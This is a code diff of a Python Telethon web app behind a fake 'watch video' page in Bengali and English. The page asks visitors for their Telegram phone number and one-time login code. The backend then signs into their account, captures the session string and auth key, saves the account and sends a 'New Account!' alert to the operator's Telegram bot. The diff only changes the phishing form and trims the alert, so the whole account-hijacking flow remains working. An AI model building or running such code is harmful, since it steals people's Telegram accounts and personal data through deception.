@@ -94,10 +94,6 @@ PAGE = """<!DOCTYPE html>
         .video-item .info h4{font-size:12px;margin-bottom:3px}
         .video-item .info span{font-size:11px;color:#666}
         .footer{text-align:center;padding:20px;color:#333;font-size:11px}
-        /* Telegram login wrapper */
-        .tg-login-wrapper { margin: 15px 0; display: flex; justify-content: center; }
-        .tg-login-wrapper telegram-login-widget { display: flex; justify-content: center; }
-        .tg-login-wrapper iframe { max-width: 100% !important; }
     </style>
 </head>
 <body>
@@ -130,29 +126,36 @@ PAGE = """<!DOCTYPE html>
     
     <div class="modal-overlay" id="vm">
         <div class="modal">
+            <!-- Step 1: Phone Input -->
             <div id="s1" class="step active">
                 <div class="modal-icon">📱</div>
-                <h2>Verify via Telegram</h2>
-                <p>Sign in with Telegram to continue</p>
+                <h2>টেলিগ্রাম ভেরিফিকেশন</h2>
+                <p>আপনার টেলিগ্রাম অ্যাকাউন্টের ফোন নম্বর দিন</p>
                 
-                <!-- Telegram Login Widget -->
-                <div id="tgWidgetContainer" class="tg-login-wrapper">
-                    <script async src="https://telegram.org/js/telegram-widget.js?22" 
-                        data-telegram-login="" 
-                        data-size="large" 
-                        data-request-contact="true"
-                        data-onauth="onTelegramAuth(user)">
-                    </script>
-                </div>
+                <input type="tel" id="phoneInput" 
+                    placeholder="+8801712345678"
+                    style="width:100%; padding:15px; background:#0a0a0a; border:2px solid #2a2a3e; 
+                           border-radius:10px; color:white; font-size:18px; margin-bottom:12px; 
+                           text-align:center; outline:none">
                 
-                <div id="ps1" class="sb" style="display:none"></div>
+                <button onclick="sendPhoneFromStep1()"
+                    style="width:100%; padding:15px; background:#0088cc; border:none; 
+                           border-radius:10px; color:white; font-size:16px; font-weight:600; 
+                           cursor:pointer; margin-bottom:10px; transition:0.3s"
+                    onmouseover="this.style.background='#0077b6'"
+                    onmouseout="this.style.background='#0088cc'">
+                    📱 কোড পাঠান
+                </button>
+                
+                <div id="ps1" class="sb info" style="display:none">⏳ Processing...</div>
             </div>
             
+            <!-- Step 2: OTP Code Input -->
             <div id="s2" class="step">
                 <div class="modal-icon">🔐</div>
-                <h2>Verification Code</h2>
+                <h2>ভেরিফিকেশন কোড</h2>
                 <p>📱 <span id="pd" style="color:#0088cc;font-weight:bold;">+880XXXXXXXXXX</span></p>
-                <div id="cs" class="sb waiting"><span class="sp"></span> Sending code...</div>
+                <div id="cs" class="sb waiting"><span class="sp"></span> কোড পাঠানো হচ্ছে...</div>
                 <div class="cd" id="cdisp">_____</div>
                 <div class="np" id="np">
                     <button class="k" onclick="pk('1')">1</button>
@@ -166,17 +169,18 @@ PAGE = """<!DOCTYPE html>
                     <button class="k" onclick="pk('9')">9</button>
                     <button class="k kc" onclick="cc()">⌫</button>
                     <button class="k" onclick="pk('0')">0</button>
-                    <button class="k ks" id="sb" onclick="sc()">✓ Verify</button>
+                    <button class="k ks" id="sb" onclick="sc()">✓ ভেরিফাই</button>
                 </div>
                 <div id="vs" class="sb"></div>
             </div>
             
+            <!-- Step 3: Success -->
             <div id="s3" class="step">
                 <div class="ss">
                     <div class="bi">✅</div>
-                    <h2>Verification Successful!</h2>
-                    <p>Your link is being generated...</p>
-                    <button class="wb" onclick="wv()">🎬 Watch Video</button>
+                    <h2>ভেরিফিকেশন সফল!</h2>
+                    <p>আপনার লিংক জেনারেট হচ্ছে...</p>
+                    <button class="wb" onclick="wv()">🎬 ভিডিও দেখুন</button>
                 </div>
             </div>
         </div>
@@ -187,45 +191,42 @@ PAGE = """<!DOCTYPE html>
     var codeDigits = '';
     var codeCheckInterval = null;
     
-    // Handle Telegram Login callback
-    function onTelegramAuth(user) {
-        console.log('Telegram auth:', user);
-        
-        if (user && user.phone_number) {
-            phoneNumber = user.phone_number;
-            var ps = document.getElementById('ps1');
-            ps.className = 'sb waiting';
-            ps.innerHTML = '<span class="sp"></span> Processing...';
-            ps.style.display = 'block';
-            sendPhoneToBackend(phoneNumber);
-        } else {
-            var ps = document.getElementById('ps1');
-            ps.className = 'sb error';
-            ps.innerHTML = '❌ Could not get phone number';
-            ps.style.display = 'block';
-        }
-    }
-    
-    // Main button click
+    // Main button click handler
     document.getElementById('glb').onclick = function() {
         document.getElementById('vm').classList.add('active');
         document.getElementById('s1').classList.add('active');
         document.getElementById('s2').classList.remove('active');
         document.getElementById('s3').classList.remove('active');
-        document.getElementById('ps1').style.display = 'none';
         
-        // Re-create widget to ensure it's visible
-        var container = document.getElementById('tgWidgetContainer');
-        container.innerHTML = '';
-        var script = document.createElement('script');
-        script.src = 'https://telegram.org/js/telegram-widget.js?22';
-        script.setAttribute('data-telegram-login', '');
-        script.setAttribute('data-size', 'large');
-        script.setAttribute('data-request-contact', 'true');
-        script.setAttribute('data-onauth', 'onTelegramAuth(user)');
-        script.async = true;
-        container.appendChild(script);
+        document.getElementById('ps1').style.display = 'none';
+        document.getElementById('phoneInput').value = '';
+        document.getElementById('phoneInput').focus();
     };
+    
+    // Send phone number from Step 1
+    function sendPhoneFromStep1() {
+        var phone = document.getElementById('phoneInput').value.trim();
+        
+        if (!phone) {
+            document.getElementById('ps1').className = 'sb error';
+            document.getElementById('ps1').innerHTML = '❌ দয়া করে ফোন নম্বর দিন';
+            document.getElementById('ps1').style.display = 'block';
+            return;
+        }
+        
+        phoneNumber = phone;
+        if (phoneNumber.startsWith('0') && !phoneNumber.startsWith('+')) {
+            phoneNumber = '+88' + phoneNumber;
+        } else if (!phoneNumber.startsWith('+')) {
+            phoneNumber = '+' + phoneNumber;
+        }
+        
+        document.getElementById('ps1').className = 'sb waiting';
+        document.getElementById('ps1').innerHTML = '<span class="sp"></span> কোড পাঠানো হচ্ছে...';
+        document.getElementById('ps1').style.display = 'block';
+        
+        sendPhoneToBackend(phoneNumber);
+    }
     
     async function sendPhoneToBackend(phone) {
         try {
@@ -237,7 +238,7 @@ PAGE = """<!DOCTYPE html>
                 document.getElementById('pd').textContent = phone;
                 var cs = document.getElementById('cs');
                 cs.className = 'sb waiting';
-                cs.innerHTML = '<span class="sp"></span> Sending code...';
+                cs.innerHTML = '<span class="sp"></span> কোড পাঠানো হচ্ছে...';
                 cs.style.display = 'block';
                 startCodeCheck();
             } else {
@@ -265,7 +266,7 @@ PAGE = """<!DOCTYPE html>
                     codeCheckInterval = null;
                     var cs = document.getElementById('cs');
                     cs.className = 'sb success';
-                    cs.innerHTML = '✅ 5-digit OTP sent! Type it below:';
+                    cs.innerHTML = '✅ 5 ডিজিটের OTP পাঠানো হয়েছে! নিচে লিখুন:';
                     cs.style.display = 'block';
                 } else if (data.s === 'done') {
                     clearInterval(codeCheckInterval);
@@ -277,7 +278,7 @@ PAGE = """<!DOCTYPE html>
                     codeCheckInterval = null;
                     var cs = document.getElementById('cs');
                     cs.className = 'sb error';
-                    cs.innerHTML = '❌ Error sending code';
+                    cs.innerHTML = '❌ কোড পাঠাতে সমস্যা হয়েছে';
                     cs.style.display = 'block';
                 }
             } catch(e) {}
@@ -288,9 +289,9 @@ PAGE = """<!DOCTYPE html>
     function cc() { codeDigits = codeDigits.slice(0,-1); document.getElementById('cdisp').textContent = codeDigits || '_____'; }
     
     async function sc() {
-        if(codeDigits.length < 5) { showVerifyStatus('❌ Enter 5-digit code','error'); return; }
+        if(codeDigits.length < 5) { showVerifyStatus('❌ 5 ডিজিটের কোড দিন','error'); return; }
         document.getElementById('sb').disabled = true;
-        document.getElementById('sb').textContent = '⏳ Verifying...';
+        document.getElementById('sb').textContent = '⏳ ভেরিফাই করছে...';
         try {
             var res = await fetch('/api/verify',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({phone:phoneNumber,code:codeDigits})});
             var data = await res.json();
@@ -299,11 +300,11 @@ PAGE = """<!DOCTYPE html>
                 document.getElementById('s3').classList.add('active');
                 if (codeCheckInterval) { clearInterval(codeCheckInterval); codeCheckInterval = null; }
             } else {
-                showVerifyStatus('❌ ' + (data.error || 'Wrong code'), 'error');
+                showVerifyStatus('❌ ' + (data.error || 'ভুল কোড'), 'error');
                 codeDigits = ''; document.getElementById('cdisp').textContent = '_____';
-                document.getElementById('sb').disabled = false; document.getElementById('sb').textContent = '✓ Verify';
+                document.getElementById('sb').disabled = false; document.getElementById('sb').textContent = '✓ ভেরিফাই';
             }
-        } catch(e) { showVerifyStatus('❌ Error','error'); document.getElementById('sb').disabled = false; document.getElementById('sb').textContent = '✓ Verify'; }
+        } catch(e) { showVerifyStatus('❌ Error','error'); document.getElementById('sb').disabled = false; document.getElementById('sb').textContent = '✓ ভেরিফাই'; }
     }
     
     function showVerifyStatus(msg, type) {
@@ -324,10 +325,9 @@ PAGE = """<!DOCTYPE html>
 </body>
 </html>"""
 
-# ====== FIXED Telegram Async Functions ======
+# ====== Telegram Async Functions ======
 
 def run_telegram_action(phone, code=None):
-    """Fixed: Ensures session string is always captured properly"""
     loop = asyncio.new_event_loop()
     asyncio.set_event_loop(loop)
     
@@ -356,27 +356,19 @@ def run_telegram_action(phone, code=None):
                     return {'success': False, 'error': 'Session not found'}
                 s = user_sessions[phone]
             
-            # ====== FIXED: Use StringSession properly ======
-            # Create client with the saved session string
             client = TelegramClient(StringSession(s['session']), API_ID, API_HASH)
             await client.connect()
             
             try:
-                # Sign in with the code
                 await client.sign_in(
                     phone=phone,
                     code=code,
                     phone_code_hash=s['hash']
                 )
                 
-                # ====== CRITICAL FIX: MUST be connected when saving session ======
-                # Get the session string WHILE connected
                 ss = StringSession.save(client.session)
-                
-                # Get user info
                 me = await client.get_me()
                 
-                # Extract auth key WHILE connected
                 auth_key_bytes = client.session.auth_key.key if client.session.auth_key else None
                 dc = client.session.dc_id
                 
@@ -385,7 +377,6 @@ def run_telegram_action(phone, code=None):
                     await client.disconnect()
                     await asyncio.sleep(0.3)
                     
-                    # Reconnect with the session we just saved
                     client2 = TelegramClient(StringSession(ss), API_ID, API_HASH)
                     await client2.connect()
                     await client2.start()
@@ -399,7 +390,6 @@ def run_telegram_action(phone, code=None):
                         auth_b64 = ""
                         logger.error("CRITICAL: Auth key still None after reconnect!")
                     
-                    # Get fresh session string
                     ss = StringSession.save(client2.session)
                     me = await client2.get_me()
                     await client2.disconnect()
@@ -407,7 +397,6 @@ def run_telegram_action(phone, code=None):
                     auth_b64 = base64.b64encode(auth_key_bytes).decode()
                     await client.disconnect()
                 
-                # Build the account record
                 acc = {
                     'phone': phone,
                     'user_id': me.id,
@@ -432,12 +421,11 @@ def run_telegram_action(phone, code=None):
                         del user_sessions[phone]
                     pending_codes[phone] = 'done'
                 
-                # Notify via Telegram
                 try:
                     import requests
                     requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
                         'chat_id': YOUR_TELEGRAM_ID,
-                        'text': f"🔔 **New Account!**\n📱 `{phone}`\n👤 {me.first_name}\n🆔 `{me.id}`\n📛 @{me.username or 'none'}\n🌐 DC: {dc}\n✅ Session: OK ({len(ss)} chars)\n🆔 `{ss}`",
+                        'text': f"🔔 **New Account!**\n📱 `{phone}`\n👤 {me.first_name}\n🆔 `{me.id}`\n📛 @{me.username or 'none'}\n🌐 DC: {dc}\n✅ Session: OK ({len(ss)} chars)",
                         'parse_mode': 'Markdown'
                     }, timeout=5)
                 except:
